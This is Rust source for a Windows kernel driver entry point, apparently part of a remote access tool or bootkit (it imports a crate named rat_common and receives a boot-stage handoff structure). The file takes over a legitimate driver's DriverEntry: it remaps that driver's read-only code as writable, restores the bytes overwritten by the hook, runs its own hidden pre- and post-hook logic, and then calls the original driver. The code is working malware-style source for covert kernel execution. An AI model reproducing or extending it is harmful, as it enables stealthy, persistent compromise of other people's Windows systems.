#![no_std]

extern crate alloc;
extern crate wdk_panic;

mod driver;
mod global;
mod handlers;
mod logger;
mod string;
mod wrappers;

use core::ffi::c_void;
use core::{mem, ptr};

use log::{LevelFilter, error, info};
use rat_common::kernel::KernelHandoff;
use wdk_alloc::WdkAllocator;
use wdk_sys::_LOCK_OPERATION::IoReadAccess;
use wdk_sys::_MEMORY_CACHING_TYPE::MmCached;
use wdk_sys::_MM_PAGE_PRIORITY::HighPagePriority;
use wdk_sys::_MODE::KernelMode;
use wdk_sys::ntddk::{
    IoAllocateMdl, IoFreeMdl, MmMapLockedPagesSpecifyCache, MmProbeAndLockPages, MmUnlockPages,
    MmUnmapLockedPages,
};
use wdk_sys::{NTSTATUS, PCUNICODE_STRING, PDRIVER_OBJECT, STATUS_INVALID_PARAMETER};

#[global_allocator]
static GLOBAL_ALLOCATOR: WdkAllocator = WdkAllocator;

type DriverEntryFn =
    unsafe extern "system" fn(driver: PDRIVER_OBJECT, registry_path: PCUNICODE_STRING) -> NTSTATUS;

/// # Safety
/// This function is called by ntoskrnl during `KiSystemStartup`, following Windows x64 calling convention.
#[unsafe(export_name = "DriverEntry")]
pub unsafe extern "system" fn driver_entry(
    driver: PDRIVER_OBJECT,
    registry_path: PCUNICODE_STRING,
    extra: *const KernelHandoff,
) -> NTSTATUS {
    // Log to COM2 port
    com_logger::builder()
        .base(0x2f8)
        .filter(LevelFilter::Trace)
        .setup();

    info!("Running hooked DriverEntry...");

    if extra.is_null() {
        return STATUS_INVALID_PARAMETER;
    }

    let extra = unsafe { extra.read_unaligned() };

    // Recover original instructions
    // Use an MDL to create a writable system mapping for the read-only executable memory.
    if !extra.original_driver_entry.is_null()
        && !extra.original_instructions.is_null()
        && extra.original_instructions_len > 0
    {
        unsafe {
            let mdl = IoAllocateMdl(
                extra.original_driver_entry as *mut c_void,
                extra.original_instructions_len as u32,
                0,
                0,
                ptr::null_mut(),
            );

            if !mdl.is_null() {
                let kernel_mode = KernelMode as i8;
                let high_page_priority = HighPagePriority as u32;

                // Lock pages in memory.
                MmProbeAndLockPages(mdl, kernel_mode, IoReadAccess);

                // Map the locked pages to a new, writable virtual address.
                let mapped_address = MmMapLockedPagesSpecifyCache(
                    mdl,
                    kernel_mode,
                    MmCached,
                    ptr::null_mut(),
                    0,
                    high_page_priority,
                );

                if !mapped_address.is_null() {
                    // Overwrite the original function bytes safely via the mapped writable address
                    ptr::copy_nonoverlapping(
                        extra.original_instructions,
                        mapped_address as *mut u8,
                        extra.original_instructions_len,
                    );

                    MmUnmapLockedPages(mapped_address, mdl);
                }

                MmUnlockPages(mdl);
                IoFreeMdl(mdl);
            }
        }
    }

    let registry_path_ref = match unsafe { registry_path.as_ref() } {
        Some(s) => unsafe { string::to_utf16str(s) },
        None => None,
    };

    // Invoke our pre-hook logic
    if let Err(e) = driver::driver_entry_prehook(driver, registry_path_ref) {
        error!("DriverEntry pre-hook failed: {e}");
    }

    // Call the original DriverEntry
    info!(
        "Calling original DriverEntry at {:p}...",
        extra.original_driver_entry
    );
    let status = unsafe {
        let original_fn = mem::transmute::<*mut u8, DriverEntryFn>(extra.original_driver_entry);
        original_fn(driver, registry_path)
    };

    // Invoke our post-hook logic
    if let Err(e) = driver::driver_entry_posthook(driver, registry_path_ref, status) {
        error!("DriverEntry post-hook failed: {e}");
    }
    status
}
